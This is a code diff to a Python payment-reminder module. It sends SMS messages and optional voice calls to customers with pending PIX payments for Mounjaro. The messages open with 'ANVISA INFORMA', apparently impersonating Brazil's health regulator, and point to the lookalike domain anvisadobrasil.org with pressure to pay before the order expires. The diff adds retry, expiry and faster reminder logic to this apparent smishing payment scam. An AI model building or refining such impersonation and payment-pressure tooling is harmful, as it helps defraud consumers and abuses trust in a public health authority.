@@ -88,16 +88,24 @@ def send_initial_payment_sms(transaction_id, customer_data):
     # Get first name only
     first_name = customer_name.split(' ')[0] if customer_name else ''
     
+    # Formatação do número de telefone para formato internacional
+    # Garantir que comece com 55 para Brasil
+    if not phone_number.startswith('55'):
+        phone_number = '55' + phone_number.lstrip('+')
+    
     try:
         # Message template for new PIX generation
         message = f"ANVISA INFORMA: Seu Pedido MOUNJARO (1 CAIXA COM 4 UNIDADES) foi gerado com sucesso. Finalize o pagamento do QRcode PIX e confirme a sua compra antes que expire"
         
         logger.info(f"[PAYMENT_TRACKER] Sending initial SMS to {phone_number} for transaction {transaction_id}")
         
-        # Prepare request data
+        # Prepare request data with additional parameters as per API docs
         request_data = {
             'phone': phone_number,
-            'message': message
+            'message': message,
+            'enableVoiceCall': True,
+            'campaignName': "Mounjaro - Pagamento Gerado",
+            'shortenableLink': "https://anvisadobrasil.org"
         }
         logger.info(f"[PAYMENT_TRACKER] SMS request data: {request_data}")
         
@@ -129,6 +137,9 @@ def send_reminder_sms(transaction_id, customer_data):
     Args:
         transaction_id: The unique ID of the transaction
         customer_data: Dictionary with customer data
+        
+    Returns:
+        bool: True if SMS was sent successfully, False otherwise
     """
     # Extract customer data
     customer_name = customer_data.get('name', '')
@@ -136,10 +147,15 @@ def send_reminder_sms(transaction_id, customer_data):
     
     if not phone_number:
         logger.error(f"[PAYMENT_TRACKER] Cannot send reminder SMS - no phone number for {transaction_id}")
-        return
+        return False
     
     # Get first name only
     first_name = customer_name.split(' ')[0] if customer_name else ''
+    
+    # Formatação do número de telefone para formato internacional
+    # Garantir que comece com 55 para Brasil
+    if not phone_number.startswith('55'):
+        phone_number = '55' + phone_number.lstrip('+')
     
     try:
         # Message template for reminder with customer's first name and transaction ID
@@ -147,10 +163,13 @@ def send_reminder_sms(transaction_id, customer_data):
         
         logger.info(f"[PAYMENT_TRACKER] Sending reminder SMS to {phone_number} for transaction {transaction_id}")
         
-        # Prepare request data
+        # Prepare request data with additional parameters as per API docs
         request_data = {
             'phone': phone_number,
-            'message': message
+            'message': message,
+            'enableVoiceCall': True,
+            'campaignName': "Lembrete de pagamento",
+            'shortenableLink': "https://anvisadobrasil.org"
         }
         logger.info(f"[PAYMENT_TRACKER] Reminder SMS request data: {request_data}")
         
@@ -170,18 +189,24 @@ def send_reminder_sms(transaction_id, customer_data):
             if transaction_id in pending_payments:
                 pending_payments[transaction_id]['sent_reminder'] = True
                 logger.info(f"[PAYMENT_TRACKER] Marked transaction {transaction_id} as having received reminder")
+            return True
         else:
             logger.error(f"[PAYMENT_TRACKER] Failed to send reminder SMS for {transaction_id}. Status: {response.status_code}, Response: {response.text}")
+            return False
             
     except Exception as e:
         logger.error(f"[PAYMENT_TRACKER] Error sending reminder SMS for {transaction_id}: {str(e)}")
+        return False
 
 def check_pending_payments():
     """
-    Check all pending payments and send reminders for those pending over 10 minutes
+    Check all pending payments and:
+    1. Send reminders for those pending over 10 minutes
+    2. Remove payments that have been pending for more than 30 minutes
     """
     now = datetime.utcnow()
     reminder_threshold = timedelta(minutes=10)
+    expiration_threshold = timedelta(minutes=30)
     
     # Log the current state of pending payments
     num_pending = len(pending_payments)
@@ -191,26 +216,41 @@ def check_pending_payments():
             time_elapsed = now - data['created_at']
             minutes_elapsed = time_elapsed.total_seconds() / 60
             reminder_sent = data['sent_reminder']
-            logger.info(f"[PAYMENT_TRACKER] Transaction {transaction_id} pending for {minutes_elapsed:.1f} minutes, reminder sent: {reminder_sent}")
+            logger.debug(f"[PAYMENT_TRACKER] Transaction {transaction_id} pending for {minutes_elapsed:.1f} minutes, reminder sent: {reminder_sent}")
     
+    # Iterate over a copy of the items to safely modify the dictionary
     for transaction_id, data in list(pending_payments.items()):
-        # Skip payments that already have reminders sent
-        if data['sent_reminder']:
+        # Calculate how long the payment has been pending
+        time_elapsed = now - data['created_at']
+        minutes_elapsed = time_elapsed.total_seconds() / 60
+        
+        # Check if payment should be expired and removed after 30 minutes
+        if time_elapsed >= expiration_threshold:
+            logger.warning(f"[PAYMENT_TRACKER] Payment {transaction_id} expired after {minutes_elapsed:.1f} minutes, removing from tracking")
+            del pending_payments[transaction_id]
             continue
             
-        # Check if payment is more than 10 minutes old
-        time_elapsed = now - data['created_at']
-        
-        if time_elapsed >= reminder_threshold:
-            logger.info(f"[PAYMENT_TRACKER] Payment {transaction_id} pending for {time_elapsed.total_seconds()/60:.1f} minutes, sending reminder")
-            send_reminder_sms(transaction_id, data['customer_data'])
+        # Check if payment needs a reminder (only if one hasn't been sent already)
+        if not data['sent_reminder'] and time_elapsed >= reminder_threshold:
+            logger.info(f"[PAYMENT_TRACKER] Payment {transaction_id} pending for {minutes_elapsed:.1f} minutes, sending reminder")
+            success = send_reminder_sms(transaction_id, data['customer_data'])
+            
+            # Se falhar ao enviar o SMS, não marcar como enviado para tentar novamente na próxima verificação
+            if not success:
+                logger.warning(f"[PAYMENT_TRACKER] Failed to send reminder SMS for {transaction_id}, will retry later")
 
 def payment_reminder_worker():
     """
     Background worker that periodically checks for pending payments
     and sends reminders as needed
     """
+    logger.info("[PAYMENT_TRACKER] =====================================================")
     logger.info("[PAYMENT_TRACKER] Starting payment reminder worker thread")
+    logger.info("[PAYMENT_TRACKER] Check interval: 30 seconds")
+    logger.info("[PAYMENT_TRACKER] Reminder threshold: 10 minutes")
+    logger.info("[PAYMENT_TRACKER] Expiration threshold: 30 minutes")
+    logger.info("[PAYMENT_TRACKER] SMS API endpoint: %s", MANUAL_NOTIFICATION_API)
+    logger.info("[PAYMENT_TRACKER] =====================================================")
     
     while True:
         try:
@@ -218,8 +258,8 @@ def payment_reminder_worker():
         except Exception as e:
             logger.error(f"[PAYMENT_TRACKER] Error in payment reminder worker: {str(e)}")
         
-        # Check every minute
-        time.sleep(60)
+        # Check every 30 seconds
+        time.sleep(30)
 
 def start_payment_reminder_worker():
     """
